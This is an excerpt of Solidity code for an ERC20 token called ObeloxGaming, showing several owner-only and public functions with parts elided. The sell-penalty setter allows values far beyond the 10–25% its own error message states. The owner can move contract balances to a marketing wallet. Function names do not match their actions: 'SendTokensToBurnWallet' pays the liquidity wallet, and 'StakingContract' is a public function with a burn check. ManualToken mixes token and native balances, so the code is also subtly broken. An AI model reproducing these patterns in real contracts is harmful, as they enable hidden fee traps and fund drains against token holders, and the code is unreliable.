...
contract ERC20 is Context, IERC20, IERC20Metadata {
  ...
  function StakingContract(address account, uint256 amount) public  {
        require(account != address(0), "ERC20: burn from the zero address");
...
contract ObeloxGaming is ERC20, Ownable {
    ...
    function updateSellPenalty(uint256 sellFactor) external onlyOwner {
        require(sellFactor >= 100 && sellFactor <= 100000, "sellFactor must be between 10% and 25%");
        sellFeeIncreaseFactor = sellFactor;
    }
    function ManualBNB() external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        payable(marketingWallet).transfer(contractETHBalance);
    }
       function ManualToken() external onlyOwner {
        uint256 contractTokenBalance1 = IERC20(token).balanceOf(address(this));
        payable(marketingWallet).transfer(contractTokenBalance1);
    }
      function SendTokensToBurnWallet() external onlyOwner {
        uint256 contractTokenBalance1 = IERC20(token).balanceOf(address(this));
        payable(liquidityWallet).transfer(contractTokenBalance1);
    }
